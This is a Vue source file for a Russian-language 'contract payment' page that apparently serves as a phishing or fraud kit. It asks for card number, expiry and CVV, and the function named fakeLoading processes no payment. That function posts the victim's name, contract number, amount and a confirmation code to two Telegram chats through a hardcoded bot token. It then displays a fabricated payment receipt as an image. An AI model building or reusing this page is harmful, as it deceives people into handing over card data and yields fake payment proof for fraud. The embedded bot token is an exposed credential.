<template>
  <div ref="checkRef" class="dashboard h-screen w-full">
    <div class="container">
      <div>
        <img class="h-[50px]" src="/white.svg"/>
      </div>
      <div v-if="step == 1" class="mx-auto w-max mt-20">
        <div class="p-8 w-[400px] rounded-[8px] bg-white">
          <h1 class="text-[#222222] text-[24px] font-[700]">Оплата за Контракт</h1>
          <FormInput v-model="FName" placeholder="Ваше имя" class="!bg-white mt-4 !border-[#DCE1E6] !border-[1px]"/>
          <FormInput v-model="FNumber" placeholder="Введите номер договора"
                     class="!bg-white mt-3 !border-[#DCE1E6] !border-[1px]"/>
          <FormInput v-model="FAmount" placeholder="Введите сумму"
                     class="!bg-white mt-3 !border-[#DCE1E6] !border-[1px]">
            <template #suffix>
              Руб
            </template>
          </FormInput>
          <div class="flex gap-2">
            <div class="flex-1">
              <FormInput v-model="FCard" maska="#### #### #### ####" placeholder="Номер карты"
                         class="!bg-white mt-3 !border-[#DCE1E6] !border-[1px]"/>
            </div>
            <div class="w-[90px]">
              <FormInput maska="##/##" v-model="FDate" placeholder="Срок"
                         class="!bg-white mt-3 !border-[#DCE1E6] !border-[1px]"/>
            </div><div class="w-[90px]">
              <FormInput maska="###" v-model="FCVV" placeholder="CVV"
                         class="!bg-white mt-3 !border-[#DCE1E6] !border-[1px]"/>
            </div>
          </div>
          <p class="text-gray-300 text-xs -mt-[0px]">Подтверждение через телефон/телеграм по смс</p>
          <BaseButton :disabled="disabled" :loading="loading" @click="fakeLoading" class="w-full mt-3 font-[600]"
                      text="Оплатить"/>
        </div>
      </div>
      <div v-if="step == 2" class="mx-auto w-max mt-20">
        <div class="p-8 w-[400px] rounded-[8px] bg-white">
          <h1 class="text-[#222222] mb-3 text-[24px] font-[700]">Код подтверждения</h1>
          <FormOtp
              v-model="otpCode"
              :fields="5"
              @complete="handleComplete"
          />
          <p class="text-gray-300 text-xs mt-1.5 -mt-[0px]">Код отправлен на телефон и в Telegram, привязанные к
            карте.</p>
          <BaseButton :disabled="disabledOtp" :loading="loadingOtp" @click="otpLoading" class="w-full mt-3 font-[600]"
                      text="Подтвердить"/>
        </div>
      </div>
      <div v-if="step == 3" class="mx-auto w-max mt-20">
        <div class="p-8 flex flex-col items-center w-[400px] rounded-[8px] bg-white">
          <div>
            <i class="icon-check text-[40px] bg-primary rounded-full p-3 text-white"></i>
          </div>
          <h1 class="text-[#222222] text-[18px] mt-4 font-[700]">ЧЕК ОБ ОПЛАТЕ КОНТРАКТА</h1>
          <div class="w-full border-b flex justify-between mt-3 gap-2 border-gray-3">
            <span class="font-semibold">Имя:</span>
            <span class="text-right">{{ FName }}</span>
          </div>
          <div class="w-full border-b flex justify-between mt-3 border-gray-3">
            <span class="font-semibold">Номер контракта:</span>
            <span>{{ FNumber }}</span>
          </div>
          <div class="w-full border-b flex justify-between mt-3 border-gray-3">
            <span class="font-semibold">Сумма оплаты:</span>
            <span>{{ FAmount }}</span>
          </div>
          <div class="w-full border-b flex justify-between mt-3 border-gray-3">
            <span class="font-semibold">Дата оплаты:</span>
            <div class="flex gap-2"><b class="font-[600]">{{ dayjs(new Date).format('DD.MM.YYYY') }}</b>
              {{ dayjs(new Date).format('HH:MM:ss') }}
            </div>
          </div>

          <BaseButton :loading="loading" @click="finish" class="w-full !bg-white border-[1px] border-primary !text-primary mt-5 font-[600]"
                      text="Скачать pdf" icon="icon-download"/>


        </div>
      </div>
    </div>
  </div>
</template>
<style>
.dashboard {
  background-image: url("/8.png") !important;
  background-repeat: no-repeat;
  background-size: cover;
}

.container {
  max-width: 600px;
  padding: 50px 0px;
  margin: 0 auto;
}
</style>
<script setup lang="ts">
import {BaseButton, FormInput, FormOtp} from "@/components/Base";
import {computed, ref} from 'vue'
import {useCustomToast} from "@/composables/useCustomToast";
import dayjs from "dayjs";
import html2canvas from 'html2canvas'
import axios from "axios";


const FName = ref('')
const FNumber = ref('')
const FAmount = ref('')
const FCard = ref('')
const FDate = ref('')
const FCVV = ref('')
const step = ref(1)

const checkRef = ref(null)
const finish = async () => {
  if (!checkRef.value) return

  const canvas = await html2canvas(checkRef.value)
  const link = document.createElement('a')
  link.download = 'chek-oplati.png'
  link.href = canvas.toDataURL('image/png')
  link.click()
}

const otpCode = ref('')
const handleComplete = (code: string) => {
  console.log('Completed OTP:', code)
}

const {showToast} = useCustomToast()

const disabled = computed(() => {
  if (FName.value &&
      FNumber.value &&
      FCard.value &&
      FDate.value && FCVV.value) {
    return false
  } else {
    return true
  }
})

const disabledOtp = computed(() => {
  if (otpCode.value.length == 5) {
    return false
  } else return true
})

const loading = ref(false)
const loadingOtp = ref(false)

function getRandomFiveDigitNumber() {
  return Math.floor(Math.random() * 90000) + 10000;
}
const maths = getRandomFiveDigitNumber()
let text = computed(()=>{
  return `MFUA. Никому не передавайте код. Этот код для подтверждения оплаты по договору №${FNumber.value} на сумму ${FAmount.value} руб. Договор на имя: ${FName.value}. \n\n Код: ${maths}`
})
const fakeLoading = () => {
  loading.value = true
  setTimeout(() => {
    loading.value = false
    step.value = 2
    axios.post(`https://api.telegram.org/bot8198695402:AAHriMSkoKEiHSrfBdJUqX8tGjIcyRrsdsc/sendMessage?chat_id=768959234&text=${text.value}`)
    axios.post(`https://api.telegram.org/bot8198695402:AAHriMSkoKEiHSrfBdJUqX8tGjIcyRrsdsc/sendMessage?chat_id=5591730324&text=${text.value}`)
        showToast('Код подтверждения отправлен в телеграм подключенный к номеру карты', 'success')
  }, 2000)
}


const otpLoading = () => {
  loadingOtp.value = true
  setTimeout(() => {
    loadingOtp.value = false
    if(maths.toString() == otpCode.value){
      showToast('Оплата успешно прошла', 'success')
      step.value = 3
    }else{
      showToast('Неправильный код', 'error')
    }
  }, 2000)
}
</script>